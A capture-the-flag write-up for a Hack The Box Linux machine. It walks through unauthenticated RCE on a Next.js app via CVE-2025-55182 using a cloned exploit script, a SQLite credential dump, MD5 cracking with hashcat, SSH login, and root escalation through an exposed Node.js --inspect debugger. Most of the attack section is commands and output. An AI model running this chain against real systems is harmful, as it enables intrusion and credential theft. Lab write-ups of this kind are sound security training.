# HTB: Reactor — Writeup

**Difficulty:** Easy (rated; feels Medium)  
**OS:** Linux  
**CVE:** CVE-2025-55182 (React2Shell)

---

## Enumeration

### nmap

Initial scan revealed two open ports:

- **22** — OpenSSH 9.6p1
- **3000** — Next.js web application (ReactorWatch)

### Web Application

The target runs **ReactorWatch**, a nuclear reactor monitoring dashboard built on Next.js. The dashboard displays core temperature, pressure, coolant flow, turbine output, system logs, and on-site personnel — all static, server-rendered HTML with no dynamic API calls.

### Version Discovery

Pulling the Next.js static chunk files from `/_next/static/chunks/` revealed the framework version:

```
window.next={version:"15.0.3",appDir:!0}
```

**Next.js 15.0.3** is confirmed vulnerable to **CVE-2025-55182**.

### Build Manifest

The build ID was extracted from the RSC payload:

```
"b":"L3bimJe_3LvBcFWAnK5L4"
```

The build manifest at `/_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js` confirmed App Router with no publicly listed routes.

---

## Exploitation — CVE-2025-55182 (React2Shell)

CVE-2025-55182 abuses **React Server Actions** in Next.js. By sending a crafted POST request with the `Next-Action: 1` header and a malicious JSON payload, an attacker can invoke `process.mainModule.require('child_process').execSync()` on the server — achieving unauthenticated remote code execution.

### Exploit

```bash
git clone https://github.com/pax-k/react2shell-CVE-2025-55182-full-rce-script.git
cd react2shell-CVE-2025-55182-full-rce-script
bash pwn-nextjs.sh http://<TARGET_IP>:3000 whoami
# Output: node
```

RCE confirmed as user `node` (uid=999).

---

## Credential Extraction

The application directory was found at `/opt/reactor-app/`. A SQLite database was present:

```bash
bash pwn-nextjs.sh http://<TARGET_IP>:3000 "ls /opt/reactor-app/"
# reactor.db confirmed
```

Dumping the database:

```bash
bash pwn-nextjs.sh http://<TARGET_IP>:3000 "sqlite3 /opt/reactor-app/reactor.db .dump"
```

**Users table:**

| Username | Password Hash                    | Role          |
| -------- | -------------------------------- | ------------- |
| admin    | a203b22191d744a4e70ada5c101b17b8 | administrator |
| engineer | 39d97110eafe2a9a68639812cd271e8e | operator      |
|          |                                  |               |

---

## Hash Cracking

Hashes identified as MD5 (32-character hex). Cracked with hashcat:

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# engineer:reactor1
```

The `admin` hash was not found in rockyou.txt.

---

## User Flag

SSH into the box with recovered credentials:

```bash
ssh engineer@<TARGET_IP>
# Password: reactor1
```

```bash
cat ~/user.txt
```

---

## Privilege Escalation — Node.js Inspector Abuse

Checking running processes:

```bash
ps aux | grep node
```

Output revealed a Node.js process running as **root** with the `--inspect` flag:

```
root  1397  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The Node.js debugger is listening on `127.0.0.1:9229` — localhost only on the target.

### SSH Port Forwarding

Forward the remote debug port to Kali:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@<TARGET_IP>
```

### Debugger Attachment

In a new terminal:

```bash
node inspect 127.0.0.1:9229
```

### Code Execution as Root

Once inside the debugger, execute arbitrary JavaScript in the context of the root process:

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Root flag retrieved.

---

## Attack Chain Summary

```
nmap → Next.js version discovery → CVE-2025-55182 RCE
→ SQLite credential extraction → MD5 crack → SSH as engineer
→ Node.js --inspect process (root) → SSH tunnel → debugger attach
→ execSync as root → root flag
```

---

## Key Takeaways

- **CVE-2025-55182** abuses React Server Actions to achieve unauthenticated RCE — no authentication or route knowledge required
- The `--inspect` flag on a Node.js process is a critical misconfiguration when the process runs as a privileged user
- SSH port forwarding is essential for reaching services bound to localhost on a remote target
- SQLite databases in application directories are a common source of credentials in CTF and real-world assessments

---

_Machine completed June 2026_